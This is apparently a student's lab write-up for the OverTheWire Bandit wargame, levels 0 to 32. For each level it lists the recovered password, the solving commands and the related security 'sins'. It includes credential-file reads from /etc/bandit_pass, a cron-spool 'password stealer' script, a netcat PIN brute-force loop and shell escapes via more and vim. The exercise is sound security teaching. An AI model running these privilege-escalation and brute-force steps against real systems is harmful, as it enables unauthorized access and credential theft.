# OverTheWire Bandit Project

## Student Information

* Student name: **Benjamin Greenberg**
* NetId: **bgreenb3**


## Project Description

In this project, you will be complete the Bandit challenges at <https://overthewire.org/wargames/bandit/>. For each challenge, you will complete the following worksheet describing:
1. The credentials found in the challenge.
2. How you solved the challenge. Include the commands and scripts you used to retrieve the credentials. You can use the linux command `history` to view commands used in the current session.
3. What sins (as found in the *24 Deadly Sins* book) are evidenced in the challenge.
4. How those sins should be addressed to address your exploit.

In the workshop, the challenges are named based on the username used to login to the shell for that challenge. For example, the challenge labeled "Natas 10" will be logged into with the username natas10, and the solution will be the credentials for the user natas11.

You can find a basic guide for markdown formatting [here](https://www.markdownguide.org/basic-syntax/). In particular, note the [code section](https://www.markdownguide.org/basic-syntax/#code) which should be used to annotate any code or commands used in your writeup.

## Hints
There are hints for each challenge on the [Bandit](https://overthewire.org/wargames/bandit/) webpage.

Below are several additional hints:
* Bandit 24: The netcat server dies if sent too much input. Limit how much content you send per connection.
* Bandit 25: This level is only finished once you have the password for bandit26. The ssh key along is insufficient. Also, how does `vi` factor into all of this?
* Bandit 28–30: Core `git` features include commits, branches, and tags.
* Bandit 32: `sh` has access to argc and argv.


## Challenges

---
### Bandit 00

#### Credentials
Password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1

#### How you passed the challenge
Used cat on the readme file

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't leave sensitive information exposed


---
### Bandit 01

#### Credentials
Password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

#### How you passed the challenge
Used ```cat ./-``` to get around the dash filename

#### What sins are evidenced in this challenge
Sin #12 

#### How could those sins be mitigated
Don't leave sensitive information exposed



---
### Bandit 02

#### Credentials
Password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

#### How you passed the challenge
Used ```cat "spaces in this filename" ``` to get around the spaces in the filename

#### What sins are evidenced in this challenge
Sin #12, Sin#17

#### How could those sins be mitigated
Don't leave sensitive information exposed



---
### Bandit 03

#### Credentials
Password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB

#### How you passed the challenge
1) I used ```ls -a inhere/``` to find the hidden file
2) I used ```cat inhere/.hidden``` to get the password
   
#### What sins are evidenced in this challenge
Sin #12, Sin#17

#### How could those sins be mitigated
Don't leave sensitive information exposed
Don't rely on hidden files/directories



---
### Bandit 04

#### Credentials
Password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh

#### How you passed the challenge
1) I used ```file inhere/-f*``` to get around the filename while checking which file was human readable
2) Used ```cat inhere/-file07``` to get the password

#### What sins are evidenced in this challenge
Sin #12, Sin#17

#### How could those sins be mitigated
Don't leave sensitive information exposed



---
### Bandit 05

#### Credentials
Password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7

#### How you passed the challenge
I used ```cat `find * -type f -size 1033c ! -executable -readable` ``` to find and output the file with the parameters specified on bandit 5->6

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't leave sensitive information exposed



---
### Bandit 06

#### Credentials
Password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

#### How you passed the challenge
I used ```cat `find * -type f -size 33c -user bandit7 -group bandit6 2>/dev/null` ``` to find and output the file with the parameters specified on bandit 6->7

#### What sins are evidenced in this challenge
Sin #12, Sin #17
Password file wasn't read protected

#### How could those sins be mitigated
Don't leave sensitive information exposed


---
### Bandit 07

#### Credentials
Password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV

#### How you passed the challenge
I used ```strings data.txt | grep millionth | awk '{print $2}'``` to get the password next to the word millionth in ```data.txt```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't leave sensitive information exposed



---
### Bandit 08

#### Credentials
Password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

#### How you passed the challenge
I used ```strings data.txt | sort | uniq -u``` to get the line that only occurs once

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't leave sensitive information exposed


---
### Bandit 09

#### Credentials
Password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

#### How you passed the challenge
I used ```strings data.txt | grep '========'``` to get the password from the human reabable line with several '=' in front of it

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't leave sensitive information exposed



---
### Bandit 10

#### Credentials
Password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

#### How you passed the challenge
```cat data.txt | base64 -d```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Use stronger encryption that can't be easily decrypted by unauthorized parties
Don't leave sensitive information exposed


---
### Bandit 11

#### Credentials
Password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

#### How you passed the challenge
```cat data.txt | tr "a-zA-Z" "n-za-mN-ZA-M"```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Use stronger encryption that can't be easily decrypted by unauthorized parties
Don't leave sensitive information exposed


---
### Bandit 12

#### Credentials
Password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

#### How you passed the challenge
1) ```xxd -r data.txt > rev.gz```
2) ```gzip -d rev.gz```
3) ```mv rev rev.bz2; bzip2 -d rev.bz2```
4) ```mv rev rev.gz; gzip -d rev.gz```
5)  ```tar xvf rev```'
6)  ```tar xvf data5.bin```
7)  ```mv data6.bin data6.bz2```
8)  ```bzip2 -d data6.bz2```
6)  ```tar xvf data6```
7)  ```mv data8.bin data8.gz```
8)  ```gzip -d data8.gz```
9)  Throughout this I used the file command to tell the type of the file
    
#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Use stronger encryption that can't be easily decrypted by unauthorized parties
Don't leave sensitive information exposed


---
### Bandit 13

#### Credentials
Password: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

#### How you passed the challenge
```ssh bandit14@localhost -i ./sshkey.private```
```cat /etc/bandit_pass/bandit14```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't leave sensitive information exposed


---
### Bandit 14

#### Credentials
Password: BfMYroe26WYalil77FoDi9qh59eK5xNr

#### How you passed the challenge
```echo "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e" | nc localhost 30000```

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't send other users' passwords in response to another user's password
Don't send sensitive information over the network in a way that an attacker can read it


---
### Bandit 15

#### Credentials
Password: cluFn7wTiGryunymYOu4RcffSxQluehd

#### How you passed the challenge
``` echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client -connect localhost:30001 -quiet```

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't send other users' passwords in response to another user's password
Don't send sensitive information over the network in a way that an attacker can read it


---
### Bandit 16

#### Credentials
Password: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn

#### How you passed the challenge
1) I used ```nmap -p 31000-32000 localhost``` to find open ports
2) I used ``` echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -connect localhost:<port> -quiet``` with each port till I got the private key from port ```31790```
   
#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't send private keys to anyone 



---
### Bandit 17

#### Credentials
Password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

#### How you passed the challenge
```diff passwords.old passwords.new```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't leave passwords exposed



---
### Bandit 18

#### Credentials
Password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

#### How you passed the challenge
1) ```ssh -t bandit18@bandit.labs.overthewire.org -p 2220 /bin/sh```
   
#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Use a whitelist to only allow verified users access 
Don't leave passwords exposed


---
### Bandit 19

#### Credentials
Password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j

#### How you passed the challenge
1) ```./bandit20-do cat /etc/bandit_pass/bandit20```

#### What sins are evidenced in this challenge
Sin #12, Sin #16, Sin #17

#### How could those sins be mitigated
Don't allow scripts to run arbitrary commands as other users
Principle of least privilege 

---
### Bandit 20

#### Credentials
Password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

#### How you passed the challenge
1) ```echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l  localhost -p 46556 &```
2) ```./suconnect 46556```

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't use scripts that give out another user's password



---
### Bandit 21

#### Credentials
Password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

#### How you passed the challenge
1) ```cat /etc/cron.d/cronjob_bandit22```
2) ```cat /usr/bin/cronjob_bandit22.sh```
3) ```cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't let cron jobs with sensitive information be world-readable



---
### Bandit 22

#### Credentials
Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

#### How you passed the challenge
1) ```cat /etc/cron.d/cronjob_bandit23```
2) ```cat /usr/bin/cronjob_bandit23.sh```
3) ```cat /tmp/`echo "I am user bandit23" | md5sum | cut  -d ' ' -f 1` ```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't let cron jobs with sensitive informtion be world-readable



---
### Bandit 23

#### Credentials
Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

#### How you passed the challenge
1) ```mkdir /tmp/bgr && cd /tmp/bgr```
2) ```cat /etc/cron.d/cronjob_bandit24```
3) ```vim pass.sh```
4) ```chmod 755 pass.sh```
5) ```touch pass && chmod 777 pass```
6) ```cp pass.sh /var/spool/bandit24```

##### Password Stealer 
```pass.sh```:
```bash
#!/bin/bash                                        

cat /etc/bandit_pass/bandit24 > /tmp/bgr/pass
```

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't let cron jobs with sensitive informtion be world-readable
Don't let unauthorized users write to other users' /var/spool/ dirs 


---
### Bandit 24

#### Credentials
Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

#### How you passed the challenge
```brute.sh```:
```bash
 #!/bin/bash
  
 for i in {0000..2500};
 do
     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i";
 done | nc localhost 30002 | grep -v "Wrong"
  
 sleep 5

for i in {2500..5000};
 do
     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i";
 done | nc localhost 30002 | grep -v "Wrong"
  
 sleep 5
  
 for i in {5000..7500};
 do
     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i";
 done | nc localhost 30002 | grep -v "Wrong"
  
 sleep 5
  
 for i in {7500..9999};
 do
     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i";
 done | nc localhost 30002 | grep -v "Wrong"                                                      

 # I don't know where the html came from below
```

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Use stronger encryption that can't be easily decrypted by unauthorized parties



---
### Bandit 25

#### Credentials
Password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

#### How you passed the challenge
1)On bandit25: ```getent passwd | grep "bandit26"```
2) ```cat /usr/bin/showtext``` - shows that bandit26 uses more to display the banner
3) Shrink screen so more doesn't exit
4) Use ```v``` to open vim from more
5) In vim, ```:tabedit /etc/bandit_pass/bandit26```

#### What sins are evidenced in this challenge
Sin #12, Sin#16, Sin #17

#### How could those sins be mitigated
Use safer methods to display login banners, or restrict the ability to open vi/vim from more if possible


---
### Bandit 26

#### Credentials
Password: 3ba3118a22e93127a4ed485be72ef5ea

#### How you passed the challenge
1) Follow the same steps as in 25->26
2) Vim: ```:set shell=/bin/bash```
3) Vim: ```:shell```
4) ./bandit27-do cat /etc/bandit_pass/bandit27

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't rely on changing the default shell to restrict access
Don't allow vim to run arbitrary command or to gain shell access



---
### Bandit 27

#### Credentials
Password: 0ef186ac70e04ea33b4c1853d2526fa2

#### How you passed the challenge
1) Log onto a random bandit server with a shell and create a temporary directory
2) Clone ```ssh://bandit27-git@localhost/home/bandit27-git/repo``` into the temp directory
3) Cat the ```README``` 

#### What sins are evidenced in this challenge
Sin #12, Sin #17

#### How could those sins be mitigated
Don't store sensitive information in a git repo or in an unencrypted file



---
### Bandit 28

#### Credentials
Password: bbc96594b4e001778eee9975372716b2

#### How you passed the challenge
1) Create a temp directory and clone ```ssh://bandit28-git@localhost/home/bandit28-git/repo```
2) Use ```git log --oneline``` to find the commit that had the password
3) Use ```git reset --hard c086d11``` to jump back and cat the ```README.md``` with the password

#### What sins are evidenced in this challenge
Sin #12, Sin #17
Commits remember everything

#### How could those sins be mitigated
Don't store sensitive information in a git repo or in an unencrypted file



---
### Bandit 29

#### Credentials
Password: 5b90576bedb2cc04c86a9e924ce42faf

#### How you passed the challenge
1) Create a temp directory and clone ```ssh://bandit29-git@localhost/home/bandit29-git/repo```
2) I couldn't find any commits with the password and didn't find any other local branches
3) I used ```git branch -r``` to list the remote branches and I used ```git checkout``` on each branch
4) I found the password in the README of the ```origin/dev```

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't store sensitive information in a git repo or in an unencrypted file



---
### Bandit 30

#### Credentials
Password: 47e603bb428404d265f59c42920d81e5

#### How you passed the challenge
1) Create a temp directory and clone ```ssh://bandit30-git@localhost/home/bandit30-git/repo```
2) I couldn't find any other commits or branches, so I used ```git tag``` to see if there might be any tags and found ```secret```
3) I used ```git show secret``` and found the password

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't store sensitive information in a git repo or in an unencrypted file
Don't store sensitive information in git tags



---
### Bandit 31

#### Credentials
Password: 56a9bf19c63d650ce78e6ec0354ee45e

#### How you passed the challenge
1) Create a temp directory and clone ```ssh://bandit31-git@localhost/home/bandit31-git/repo```
2) Cat README and follow the instructions to create ```key.txt```
3) Force add ``key.txt``` to the repo with ```git add key.txt -f```
4) Push the commit to master with the password from the previous level to get the next password

#### What sins are evidenced in this challenge
Sin #12,

#### How could those sins be mitigated
Don't return sensitive information in git responses



---
### Bandit 32

#### Credentials
Password: c9c3199ddf4121b10cf581a98d51caee

#### How you passed the challenge
1) Since no commands can be entered directly, I used ```$0``` as both are characters that won't be capitalized, and the command expanded to the name of the current script or shell in this case
2) I used ```cat /etc/bandit_pass/bandit33``` to get the next password

#### What sins are evidenced in this challenge
Sin #17

#### How could those sins be mitigated
Don't rely on only altering alpha characters to prevent users from executing commands


